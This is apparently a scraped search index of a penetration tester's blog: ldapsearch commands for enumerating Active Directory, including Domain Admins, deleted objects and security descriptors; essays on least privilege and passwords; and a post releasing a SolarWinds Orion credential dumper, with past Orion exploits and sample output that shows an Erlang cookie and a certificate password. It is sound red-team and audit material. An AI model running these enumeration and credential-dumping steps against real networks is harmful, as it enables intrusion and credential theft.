DirectoryEmailReplication certificateTemplates: DomainControllerAuthentication certificateTemplates: KerberosAuthentication certificateTemplates: EFSRecovery certificateTemplates: EFS certificateTemplates: DomainController certificateTemplates: WebServer certificateTemplates: Machine certificateTemplates: User certificateTemplates: SubCA certificateTemplates: Administrator ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:4","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Nested Group Membership A query like this: $ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b \"dc=sittingduck,dc=info\" '(memberOf=cn=Domain Admins,cn=Users,dc=SittingDuck,dc=info)' cn will result in all of the accounts that have a memberOf attribute of Domain Admins. This will show you the first level of membership, but LDAP/AD actually has a way to identify nested membership using the 1.2.840.113556.1.4.1941 OID: $ ldapsearch -x -LLL -h dc1.sittingduck.info -w ASDqwe123 -D uberuser -b \"dc=sittingduck,dc=info\" '(memberOf:1.2.840.113556.1.4.1941:=cn=Domain Admins,cn=Users,dc=sittingduck,dc=info)' cn This will show you all Domain Admins even if they are in a group in a group in a group in a group. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:5","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Find Exchange Servers $ ldapsearch -LLL -h 192.168.80.10 -o ldif-wrap=no -x -D uberuser -w ASDqwe123 -b \"cn=Configuration,dc=sittingduck,dc=info\" \"(objectCategory=msExchExchangeServer)\" dn dn: CN=SDEXCHANGE,CN=Servers,CN=Exchange Administrative Group (FYDIBOHF23SPDLT),CN=Administrative Groups,CN=First Organization,CN=Microsoft Exchange,CN=Services,CN=Configuration,DC=sittingduck,DC=info ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:6","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Deleted / Tombstoned objects Looking at deleted and tombstoned objects won’t always get you much information you can directly use, but sometimes there are passwords or other sensitive data stored in objects. (I don’t believe deleting objects changes their permissions but I could be wrong here) $ ldapsearch -h 192.168.80.10 -x -w ASDqwe123 -D uberuser -b \"CN=Deleted Objects,DC=sittingduck,DC=info\" -E '!1.2.840.113556.1.4.417' For example here is a Computer account that was deleted: # blah1 DEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef, Deleted Objects, sittingduck. info dn: CN=blah1\\0ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN=Deleted Objects,DC= sittingduck,DC=info objectClass: top objectClass: person objectClass: organizationalPerson objectClass: user objectClass: computer cn:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg== distinguishedName: CN=blah1\\0ADEL:2f7b19b1-9dee-4a48-8bb0-ad62e6a287ef,CN=Dele ted Objects,DC=sittingduck,DC=info instanceType: 4 whenCreated: 20220512041425.0Z whenChanged: 20220512045921.0Z uSNCreated: 2663983 isDeleted: TRUE uSNChanged: 2664044 name:: YmxhaDEKREVMOjJmN2IxOWIxLTlkZWUtNGE0OC04YmIwLWFkNjJlNmEyODdlZg== objectGUID:: sRl7L+6dSEqLsK1i5qKH7w== userAccountControl: 4128 objectSid:: AQUAAAAAAAUVAAAAfS9vpuKLWG5ZpW7N9RUAAA== sAMAccountName: BLAH1$ lastKnownParent: CN=Computers,DC=sittingduck,DC=info isRecycled: TRUE ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:7","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Replication Metadata src: https://posts.specterops.io/hunting-with-active-directory-replication-metadata-1dab2f681b19 src: https://stackoverflow.com/a/38710484 This is one place where ldapsearch isn’t quite as cool as other tools, all of the base64 output. I did find a great way to decode most of it on StackOverflow: | perl -MMIME::Base64 -n -00 -e 's/\\n +//g;s/(?\u003c=:: )(\\S+)/decode_base64($1)/eg;print' Basically you are pipeing the output of ldapsearch into a bit of perl that Base64 decodes anything that looks like Base64. Back on track, there is a ton of great info in Replication metadata but the blog post from SpecterOps above. $ ldapsearch -h 192.168.80.10 -o ldif-wrap=no -x -w ASDqwe123 -D sittingduck\\\\uberuser -b \"CN=Administrator,CN=Users,DC=sittingduck,DC=info\" msDS-ReplAttributeMetaData # extended LDIF # # LDAPv3 # base \u003cCN=Administrator,CN=Users,DC=sittingduck,DC=info\u003e with scope subtree # filter: (objectclass=*) # requesting: msDS-ReplAttributeMetaData # # Administrator, Users, sittingduck.info dn: CN=Administrator,CN=Users,DC=sittingduck,DC=info msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5tc0RTLVN1cHBvcnRlZEVuY3J5cHRpb25UeXBlczwvcHN6QXR0cmlidXRlTmFtZT4KCTxkd1ZlcnNpb24+MTwvZHdWZXJzaW9uPgoJPGZ0aW1lTGFzdE9y aWdpbmF0aW5nQ2hhbmdlPjIwMTUtMTAtMTRUMDM6Mjg6MTRaPC9mdGltZUxhc3RPcmlnaW5hdGluZ0NoYW5nZT4KCTx1dWlkTGFzdE9yaWdpbmF0aW5nRHNhSW52b2NhdGlvbklEPjhkMmExZjVjLTU4ZDQtNGVmYS1iY2QyLWY3ZDg1ZWY1MzAxMzwvdXVpZExhc3RPcmlna W5hdGluZ0RzYUludm9jYXRpb25JRD4KCTx1c25PcmlnaW5hdGluZ0NoYW5nZT4xMjc3NjwvdXNuT3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXNuTG9jYWxDaGFuZ2U+MTI3NzY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaW dpbmF0aW5nRHNhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA== msDS-ReplAttributeMetaData:: PERTX1JFUExfQVRUUl9NRVRBX0RBVEE+Cgk8cHN6QXR0cmlidXRlTmFtZT5sYXN0TG9nb25UaW1lc3RhbXA8L3BzekF0dHJpYnV0ZU5hbWU+Cgk8ZHdWZXJzaW9uPjI8L2R3VmVyc2lvbj4KCTxmdGltZUxhc3RPcmlnaW5hdGluZ0No YW5nZT4yMDE3LTA2LTIwVDAwOjE3OjIyWjwvZnRpbWVMYXN0T3JpZ2luYXRpbmdDaGFuZ2U+Cgk8dXVpZExhc3RPcmlnaW5hdGluZ0RzYUludm9jYXRpb25JRD4yOWJkZWQ4MS0xMGRmLTQ0YTMtOGVkNi0xOWY1ODJjYjhiNGU8L3V1aWRMYXN0T3JpZ2luYXRpbmdEc2FJb nZvY2F0aW9uSUQ+Cgk8dXNuT3JpZ2luYXRpbmdDaGFuZ2U+MzQzOTQ2PC91c25PcmlnaW5hdGluZ0NoYW5nZT4KCTx1c25Mb2NhbENoYW5nZT4zNDM5NDY8L3VzbkxvY2FsQ2hhbmdlPgoJPHBzekxhc3RPcmlnaW5hdGluZ0RzYUROPjwvcHN6TGFzdE9yaWdpbmF0aW5nRH NhRE4+CjwvRFNfUkVQTF9BVFRSX01FVEFfREFUQT4KAA== With the Perl trick: $ ldapsearch -h 192.168.80.10 -o ldif-wrap=no -x -w ASDqwe123 -D sittingduck\\\\uberuser -b \"CN=Administrator,CN=Users,DC=sittingduck,DC=info\" msDS-ReplAttributeMetaData | perl -MMIME::Base64 -n -00 -e 's/\\n +//g;s/(?\u003c=:: )(\\S+)/decode_base64($1)/eg;print' # extended LDIF # # LDAPv3 # base \u003cCN=Administrator,CN=Users,DC=sittingduck,DC=info\u003e with scope subtree # filter: (objectclass=*) # requesting: msDS-ReplAttributeMetaData # # Administrator, Users, sittingduck.info dn: CN=Administrator,CN=Users,DC=sittingduck,DC=info msDS-ReplAttributeMetaData:: \u003cDS_REPL_ATTR_META_DATA\u003e \u003cpszAttributeName\u003emsDS-SupportedEncryptionTypes\u003c/pszAttributeName\u003e \u003cdwVersion\u003e1\u003c/dwVersion\u003e \u003cftimeLastOriginatingChange\u003e2015-10-14T03:28:14Z\u003c/ftimeLastOriginatingChange\u003e \u003cuuidLastOriginatingDsaInvocationID\u003e8d2a1f5c-58d4-4efa-bcd2-f7d85ef53013\u003c/uuidLastOriginatingDsaInvocationID\u003e \u003cusnOriginatingChange\u003e12776\u003c/usnOriginatingChange\u003e \u003cusnLocalChange\u003e12776\u003c/usnLocalChange\u003e \u003cpszLastOriginatingDsaDN\u003e\u003c/pszLastOriginatingDsaDN\u003e \u003c/DS_REPL_ATTR_META_DATA\u003e msDS-ReplAttributeMetaData:: \u003cDS_REPL_ATTR_META_DATA\u003e \u003cpszAttributeName\u003elastLogonTimestamp\u003c/pszAttributeName\u003e \u003cdwVersion\u003e2\u003c/dwVersion\u003e \u003cftimeLastOriginatingChange\u003e2017-06-20T00:17:22Z\u003c/ftimeLastOriginatingChange\u003e \u003cuuidLastOriginatingDsaInvocationID\u003e29bded81-10df-44a3-8ed6-19f582cb8b4e\u003c/uuidLastOriginatingDsaInvocationID\u003e \u003cusnOriginatingChange\u003e343946\u003c/usnOriginatingChange\u003e \u003cusnLocalChange\u003e343946\u003c/usnLocalChange\u003e \u003cpszLastOriginatingDsaDN\u003e\u003c/pszLastOriginatingDsaDN\u003e \u003c/DS_REPL_ATTR_META_DATA\u003e ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:8","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"NTSecurityDescriptor While I personally don’t recall ever running into an instance where I wasn’t able to read the security descriptor via ldapsearch, it’s just because I’ve only went after very specific objects and not that it never happens. Lee Christensen (@tifkin_) figured out a way to read security descriptors as low privileged users. Honestly I don’t know how it works, but here it is: https://twitter.com/tifkin_/status/1372628611677753344 Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv’ed user? Add the following argument: -E '!1.2.840.113556.1.4.801=::MAMCAQc=' Ever want to dump AD security descriptors from an OS X or Linux machine using ldapsearch as a low priv'ed user? Add the following argument: -E '!1.2.840.113556.1.4.801=::MAMCAQc=' pic.twitter.com/vMi7RPsYPB — Lee Christensen (@tifkin_) March 18, 2021 ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:9","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"AD Password Dumping via LDAP src: https://stackoverflow.com/questions/59406408/is-there-any-way-to-retrieve-password-hashes-from-an-active-directory-via-ldap src: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/6e803168-f140-4d23-b2d3-c3a8ab5917d2 Every so often I forget it’s not possible to sync passwords from the unicodePwd attribute. I’m saving this here mostly so I don’t waste my time trying again. From MSDN: The unicodePwd attribute is never returned by an LDAP search. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:1:10","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"References For futher info, the LDAP Wiki is an amazing resource. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:2:0","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Ropnop’s Talk at Troopers 2019 You should absolutely check out Ropnop (and follow him on Twitter) if you want to learn more. ","date":"2022-05-14","objectID":"https://malicious.link/posts/2022/ldapsearch-reference/:2:1","tags":["ldap","ldapsearch","notes"],"title":"LDAPSearch Reference","uri":"https://malicious.link/posts/2022/ldapsearch-reference/"},{"categories":null,"content":"Lesson 2 - Least Privilege No one should have administrative access. All elevated access should be checked out when you need it and checked back in (automatically if possible). Just like UAC. MFA should be required, proximity or push based. And every use of a break glass account should be highly monitored I think “Least Privilege” has been harped on at least … you know what, let me wager that you can’t find a single infosec or hacking conference from 2000 until now (2022) that doesn’t have 4 talks with the words “least privilege” in the talk. But maybe a handful out of all of those talks tell you how to accomplish such a feat. ","date":"2022-05-08","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/:1:0","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 2","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/"},{"categories":null,"content":"The Goal Lets talk about the goal first though, just-in-time administration. Identity and Access Management (IAM) has tried very hard to steal the “Just-In-Time” (JIT) terminology from the software development and reverse engineering world but I don’t think it has ever stuck. I do however completely agree with it’s concepts. JIT Privilege Access Management (JIT PAM, try to say that acronym in a meeting, probably won’t end well), is the concept where you get rid of all of the administrative accounts across your entire organization, replacing them with temporary (you only have access to the account for a short amount of time) and even sometimes transitory (the admin account gets deleted after use) administrative accounts. That’s the goal, where if you business closes down at 8 PM on a Friday, by 9 PM (for example), there isn’t a single administrative account left on your company network. ","date":"2022-05-08","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/:1:1","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 2","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/"},{"categories":null,"content":"Why is this needed? Right now, in the organization that you work in, can an IT admin use their own administrative account to make a change to your systems or network? Of course, that’s their job. We definitely don’t want to hinder them from doing their job right? Here are the problems that this scenario faces: The password for administrative accounts should be much more secure but many times it’s not, since it’s up to a human to select. They also have to type it in a large number of times a day so we don’t want to make it difficult to do so. The time an administrative user’s password is valid for can be weeks, months, years. An administrative user can forget or simply not know the correct way to log out of sessions with administrative access (this is super common both on web applications and RDP) Very rarely have I seen a network completely devoid of “old” or “forgotten” administrative users. This could be a lack of off-boarding process or just laziness but it’s pretty universal. Where does the administrator write down which systems they are going to access or which actions they are going to perform? Admins leave all kinds of scripts and saved passwords lying around on systems they only access for short periods of time. We all do this, if we didn’t then kiosks in hotels wouldn’t need to be wiped between use… oh yea, they aren’t… you get the point. I can use a vaulting product to take care of #1, #2, and possibly help with #4. I can use Active Directory GPOs to work on #2 and #3 possibly. But there is still no accountability around what actions are being performed or on what systems. ","date":"2022-05-08","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/:1:2","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 2","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/"},{"categories":null,"content":"How do we get there? Start with pairing down and auditing the list of administrators. Starting with Domain Admins is easy. Narrow it down to just the people who actually truly need that much access. Now make a generic Domain Admin accounts instead of the personalized ones and vault them. It’s ok if the admins each still use just one of those accounts. This is getting them used to the idea that these aren’t “their” accounts and they can’t just leave stuff on the desktop or saved passwords. Make MFA required to check out these generic accounts. Enable “reason” fields in your vaulting software (like Hashicorp Vault, CyberArk or Thycotic) and push those logs to your SEIM / logging platform (or better yet, into and admins chat channel that the IR team has access to as well) Make all profile customization (files on desktops, custom terminal sessions, etc) get deleted once the account is checked back in. (this will require roaming profiles or a way to manage it remotely) Now start doing that for each and every administrative group / accounts, cloud, network infrastructure, virtualization platforms, databases, etc. Eventually you’ll get to a place where it’s normal for people to check out accounts and have it log why they are doing so, then everything access privilege that account has is revoked and the password is automatically rotated and randomized. You can even get to the point where they have to specify the servers they need to access and it only gives them access to just those servers. ","date":"2022-05-08","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/:1:3","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 2","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-02/"},{"categories":null,"content":"Lesson 1 - YOU could be “Legacy” Stop thinking that just because it did or didn’t work X way when you learned it, it still does or doesn’t. That could be 20 years ago. Technology changes faster than you do. I guess that’s a bit mean for a title but here’s the thing: One of the greatest yet most challenging things about doing any job in technology is staying current. Everyone struggles to stay up to date with as much of what is going on around you. Many people specialize, which makes it easier to stay up to date with a specific thing. Yet that can lead to tunnel vision as well. All I’m trying to say here is that sometimes, the person with the least amount of “experience” in a given technology field is going to have the most open mind to what is possible. No matter how long you have been in cyber security or technology in general, you should consider your knowledge on a specific topic a point in time piece of information. At that exact moment in your life, that fact was true. This doesn’t mean that it stays that way. Take passwords for example. Everyone said “8 character passwords are secure” for decades. I’m still hearing that. Or “never write your passwords down”. This is just one example. “Never use X software, it’s insecure”, is it still?. One of the ways I stay “current” is by always challenging my knowledge of how I think things should work vs how they do. This is why during my keynote I noted when and where I leaned these lessons, there is every possibility I am complete off base with all of them. This is also why it’s my beautiful basics lesson #1. Something to always keep top of mind. ","date":"2022-05-07","objectID":"https://malicious.link/posts/2022/beautiful-basics-lesson-01/:1:0","tags":["beautifulbasics","series"],"title":"Beautiful Basics: Lesson 1","uri":"https://malicious.link/posts/2022/beautiful-basics-lesson-01/"},{"categories":null,"content":"Today I keynoted @BSidesVancouver. It was an honor to be asked and I had a great time. Conference Link: https://hopin.com/events/bsides-vancouver-2022/ I talked about 11 lessons learned over my career that contradict some of the edicts that are well known in the Cyber Security space. Before we get into the lessons though, let me attack the things I know many of you reading this already have queued up in your head. Counter Point 1 “All of that is well and good, but it’ll never work where I work.” Why not? Every single one of these lessons learned are things that I was told wasn’t possible. For the most part they were things I didn’t even do, they were things either already in place when I joined the company or put into place while I worked there. I saw first hand that something I was told was “impossible” was not only possible but accomplished much more than I could have imagined. Until you see something for yourself, it’s hard to go against what you are taught, but as Security Professionals isn’t that what we are supposed to do? Look beyond the scope of what is seen as “possible”? Counter Point 2 “It’s not as easy as you are making it sound.” You are right, none of this is easy. Good work hardly ever is. If you are looking for the easy solution, something that can be done in a day or a week this is not the blog series for you. Counter Point 3 “We already known all of this” Awesome! I wish I would have known these things earlier in my career. ","date":"2022-05-02","objectID":"https://malicious.link/posts/2022/beautiful-basics/:0:0","tags":["beautifulbasics","series"],"title":"Beautiful Basics - Series","uri":"https://malicious.link/posts/2022/beautiful-basics/"},{"categories":null,"content":"World Password Day (who knew that was a thing?) is upon us. It is the first Thursday of May every year, and that falls on May 6th this year. I’m not sure how to start this blog post, but the meat of what I want to get into is password security and the evolution over the years. In the 1900s (… yes people are saying that now… feel old yet?), password security was pretty simple. The mainframe only accepted eight characters max for a password anyways, and it was case insensitive (many mainframes still operate this way). They also stored your password in plain text, where anyone with administrative rights (SysAdmin or criminal) could read them. Different hashing algorithms started to become more widely used, like MD5, LM, NTLM, and SHA1. These hashes increased that maximum length ceiling and provided a fast and more secure method of storing the passwords. However, the speed of these hashing algorithms also meant that criminals could crack them quickly too. Researchers put in the time and found that by increasing the type of characters used (from just alphanumeric [a-z 0-9], to include special characters [a-z 0-9 ;!@#$%^\u0026*()] ), they could make cracking these hashes exponentially more difficult. So, “Password Complexity” made it into every policy and standard. “You must require password complexity to be compliant” - PCI-DSS. What went wrong is that computers and human psychology don’t always fit into the same mold. Asking human people to select a special character means not that they will select from the 100+ that are readily available on any given keyboard; no, they will choose the ones that are most common to their normal typing, such as exclamation marks, periods, question marks, and hashtags. The other bit of psychology that goes into here, and the reason why spaces aren’t on that list; is that many websites have their own list of “acceptable” special characters. This meant your personal list of “acceptable” special characters resulted from which ones caused the least amount of problems on the least amount of sites. For example, if you tried to use a space in your password on Facebook which worked, but then you tried it on your bank, and it didn’t work, the following account you tried to create probably wouldn’t have a space in it just because you didn’t want to go through the hassle of selecting a new password yet again. Then along came password rotations. This was a bad idea from the get-go. Password rotations came about because people would select simple passwords that would be dictionary-based and fit into their world of acceptable characters that we talked about a second ago. This would result in passwords like Password1!. So, the idea went that if we force people to change their passwords regularly, this will make it so they have to pick a different password and which will reduce the window of opportunity for criminals to take advantage of weak passwords. This did not end well, and many companies are still in this phase. The result was passwords like Winter2020, then 90 days later, Summer2021. This is infinitely worse because instead of just a limited set of special characters being used, the majority of users would now be using a limited set of numbers (year) and words (season/month). These were actually guidelines detailed by NIST in NIST Special Publication 800-63B in 2017. Then, in 2020, an update to NIST Special Publication 800-63B came in the form of more sensible standards that took human psychology into account. The update included focusing on length over complexity, spaces as special characters, regular password auditing, and a host of other things. But even in 2021, we as a security industry are having a tough time getting people to select “good” passwords. So how do we do that? By incentivizing security through user empowerment. We can do that through a tiered approach to password policies. This can work today in any organization with Active Directory but will probably take some heavy engineering to incorporate ","date":"2021-04-27","objectID":"https://malicious.link/posts/2021/user-empowerment-password-security/:0:0","tags":["rant","passwords"],"title":"User Empowerment: Password Security","uri":"https://malicious.link/posts/2021/user-empowerment-password-security/"},{"categories":null,"content":"TL;DR Here are the concerns I have regarding the SolarWinds/FireEye breach: The accounts stored in an organization’s SolarWinds Orion may be underestimated. I recently did a pentest for a firm that had over 200 credentials stored in their SolarWinds Orion database, but only 15 showed in the interface (the SolarWinds credential interface is complicated with sections for each connection type and different panes for each, it may also not properly delete credentials from the database when “removed” from the interface, I am unsure). The re-infection possibilities, from one-time access to SolarWinds Orion database and file system, is being underestimated. Attackers can directly re-infect SolarWinds Orion systems through Erlang and other vulnerabilities. Rotating these credentials is HARD. Not enough is being talked about on how to properly secure SolarWinds Orion machines. I’m releasing this tool after a lot of thought surrounding the SolarWinds/FireEye breach. It’s been in development since 2015. The reason I developed SolarFlare in the first place was to assist in my Red Team engagements. The main reason to release the tool publicly, right now, is so businesses can identify one facet of the possible severity of this breach, using a simple command-line tool they can run on their own SolarWinds Orion machines. SolarFlare can help identify the accounts that may have been compromised during this breach. SolarWinds is not an easy application to quickly identify which credentials are stored in the database. SolarFlare parses all of the needed pieces, connects to the database, and decrypts (where possible) all of the account data stored in the database. I have seen everything from regular Active Directory accounts, to AWS/Azure/Meraki API keys, and Cisco enable passwords. Now that I’ve mentioned their encryption, before we start going down this rabbit hole, I must say that SolarWinds did a fantastic job at doing as much cryptography as possible to ensure that credential theft is not trivial. They had even made more improvements since 2015 when I first started researching the product. However, at the end of the day, SolarWinds Orion needs to have the ability to use the credentials in clear text, so no matter how much encryption they add, it will only ever be obfuscation. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:1:0","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"History In 2016 I gave two talks, one at BSidesPhilly and the other at KiwiCon2016, down in New Zealand. These talks focused on the credentials I was able to steal out of SolarWinds Orion. At this time, I did not release any tooling to exploit access to SolarWinds, but I did talk about how reversing the credentials could easily be done due to the use of an exportable self-generated RSA key. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:0","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Video from BSidesPhily 2016 ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:1","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"KiwiCon 2016 KiwiCon 2016 - Kicking Orion's Assets from Rob Fuller ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:2","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Erlang Fast forward to 2018, I released a blog post, again about SolarWinds, where I talked more about the severe effects of exploiting SolarWinds Orion. SolarWinds makes use of RabbitMQ, which uses Erlang (a distributed programming language). An attacker with file-level access to the SolarWinds machine, either through code execution, access to backup files, or just a poorly permissioned share, could steal the file .erlang.cookie from the ProgramData directory and have SYSTEM level code execution to this day. Changing this “cookie” is non-trivial. There isn’t a method in the SolarWinds Orion interface to do so. I have been successful with just shutting down all of the SolarWinds services, altering the string in the file, and starting the services back up, but I cannot guarantee this won’t break things in more robust corporate installs. A more complete method of defense is to simply Block port 25672/tcp inbound to your SolarWinds Orion box. This is the port that can be remotely accessed for remote code execution if an attacker has stolen the .erlang.cookie file. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:3","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"HD Moore A few months later, HD Moore released a blog post on the Atredis blog talking about the password hashing in SolarWinds Orion as well as how to decrypt the password from the SolarWinds Orion database. He also released the tools on Github to do so. Also, the password cracking tools Hashcat and John the Ripper added cracking capabilities for SolarWinds Orion password hashes. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:4","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"NPM In late 2018, early 2019, VeraSprite researchers released CVE-2019-8917. This vulnerability affected SolarWinds Orion 12.3 and the WCF protocol it incorporated for communications. There was a blog post, and a short video demonstrating the vulnerability. This vulnerability resulted in remote code execution as SYSTEM on the SolarWinds machine but does require valid credentials for the SolarWinds Orion interface. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:5","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"ActiveCyber In February of 2019, ActiveCyber identified a local privilege escalation bug in SolarWinds (CVE-2019-9546). Any user on the SolarWinds box could write handle.exe to C:\\ProgramData\\SolarWinds\\Orion\\RabbitMQ\\ directory and have it executed as SYSTEM every 5 minutes. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:6","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"CPL3H In July of 2019, CPLSEC/CPL3H put together a blog post about adding modules to their (DarknessCherry \u0026 CPLSEC) tool BADministrator. These are the modules they released (directly ripped from the blog post): solarwinds-enum – Enumerates all Solarwinds clients solarwinds-listalerts – Lists Solarwinds alerts solarwinds-alertremove – Removes the malicious alert used in the syscmd module solarwinds-syscmd – Executes system commands on the NMS server BADministration_SWDump.exe – Standalone memory scraper which (hopefully) retrieves Solarwinds WMI credentials The SWDump tool steals the WMI credentials (usually Domain Admin or at least admin on a lot of systems) from client machines that have the SolarWinds log collector service installed. Teh SYSCmd utilizies importing alert configurations to execute commands directly on the SolarWinds system as SYSTEM. You do need to be an administrator level user to do so, but it does this via the SolarWinds web API, so even if you have all other ports blocked to attacker, if they can achieve SolarWinds admin credentials, they can still get code execution on the machine. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:2:7","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Present Day Today I am releasing SolarFlare. SolarFlare is a Authentication Audit / Password dumping tool originally designed for Red Team engagements, but can be used to audit the exposure SolarWinds Orion systems pose to an organization. Below I will walk through each section of the output from SolarFlare. There are no options or arguments. ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:0","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"Erlang Cookie This function simply reads the .erlang.cookie file from the ProgramData directory where it’s stored. You can find this file at %PROGRAMDATA%\\SolarWinds\\Orion\\RabbitMQ\\.erlang.cookie. It is a randomized string created during installation. This string does not change as far as I have observed. This string is also stored in the database. ============================================ | Collecting RabbitMQ Erlang Cookie | Erlang Cookie: abcdefg12456789abcde ","date":"2020-12-15","objectID":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/:3:1","tags":["tool","password","github","solarwinds","orion"],"title":"SolarFlare Release: Password Dumper for SolarWinds Orion","uri":"https://malicious.link/posts/2020/solarflare-release-password-dumper-for-solarwinds-orion/"},{"categories":null,"content":"RSA Key The “SolarWinds-Orion” RSA key is stored in the SYSTEM/LocalMachine certificate store and is generated during install. This certificate is used as the PKI based encryption/decryption for credentials stored int the database. I do not know why this certificate is generated in a way that makes it exportable. But, it doesn’t not need to be exportable for the decryption to be used. This certificate can be used along with the Atradis tool on Github to decrypt credentials from the database, offline. ============================================ | Collecting SolarWinds Certificate | SolarWinds Orion Certificate Found! | Subject Name: CN=SolarWinds-Orion | Thumbprint : BE85C6C3AACA8840E166187B6AB8C6BA9DA8DE80 | Password : alcvabkajp4 | Private Key : MIIKHwIBAzCCCd8GCSqGSIb3DQEHAaCCCdAEggn\u003csnip\u003e 